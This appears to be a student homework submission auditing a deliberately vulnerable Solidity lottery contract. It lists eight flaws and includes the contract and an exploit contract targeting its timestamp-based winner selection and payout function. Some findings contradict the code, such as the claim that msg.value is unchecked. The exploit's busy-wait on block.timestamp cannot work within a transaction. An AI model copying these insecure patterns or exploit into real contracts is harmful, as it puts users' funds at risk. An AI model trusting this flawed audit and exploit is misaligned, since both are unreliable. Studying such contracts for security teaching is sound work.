## Homework 7

```js

1. Function addNewPlayer, the num_players counter is incremented before checking if the player has paid the 500000 entry fee. 
    This means that the player counter is incremented even if the player does not meet the requirements to join the game.
    
2. The addNewPlayer function does not validate the value sent by the player. 
    This means that any player who sends ether to the contract with an amount different from 500000 can be accepted and will be added to the list of players.
    
3. Incorrect variable implementation order:

    uint256 public prizeAmount; 
    uint256 public num_players;       
    address payable[] public players;
    address payable[] public prize_winners;
    
4. Using block.timestamp as a random number generator
    Winner selection is predictable: The pickWinner function relies on block.timestamp to select a winner. 
    If an attacker can predict the value of block.timestamp at the time the pickWinner function is executed, then he can manipulate the outcome of the game and ensure that he wins.
    
5. It does not have a withdrawal function.

6. Anyone can call the functions, it has no security.

7. In the distributePrize function, the for loop has an error in the condition, as it should be < prize_winners.length instead of <=                        prize_winners.length, as the index starts at zero and should be less than the length of the array.

8. It has visibility failures in the functions, it uses public when it is not necessary.

```


## Test Code
- It is not properly implemented, it is only a test for testing purposes. 

```js

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract BadLotteryGame {
    uint256 public prizeAmount;         // payout amount
    address payable[] public players;    
    uint256 public num_players;        
    address payable[] public prize_winners; 

    event winnersPaid(uint256);

    constructor() {}

    function addNewPlayer(address payable _playerAddress) public payable {
        if (msg.value == 500000) {
            players.push(_playerAddress);
        }
        num_players++;
        if (num_players > 5) {
            emit winnersPaid(prizeAmount);
        }
    }

    function pickWinner(address payable _winner) public {
        if ( block.timestamp % 15 == 0){    // use timestamp for random number
            prize_winners.push(_winner);
        }          
    }

    function payout() public {
        if (address(this).balance == 500000 * 100) {
            uint256 amountToPay = prize_winners.length / 100;
            distributePrize(amountToPay);
        }
    }

    function distributePrize(uint256 _amount) public {
        for (uint256 i = 0; i <= prize_winners.length; i++) {
            prize_winners[i].transfer(_amount);
        }
    }
}

contract Expliot {


    BadLotteryGame public badLotteryGame;

    constructor (address _Loterry){
        badLotteryGame = BadLotteryGame(_Loterry);

    }


  function attack (address payable _target) public returns(bool) {
    badLotteryGame.addNewPlayer(_target);

    uint256 blockTime = block.timestamp;
    uint256 randNum = uint256(keccak256(abi.encodePacked(blockTime)));
    uint256 winnerPickTime = blockTime + (15 - blockTime % 15) + randNum % 15;

    while (block.timestamp < winnerPickTime) {
        // wait until the next multiple of 15
    }

    badLotteryGame.pickWinner(_target);
    badLotteryGame.payout();

    return true;
}
    receive() external payable {
        
       while (badLotteryGame.prizeAmount() > 0){
            badLotteryGame.payout();
        }

    }

}
```
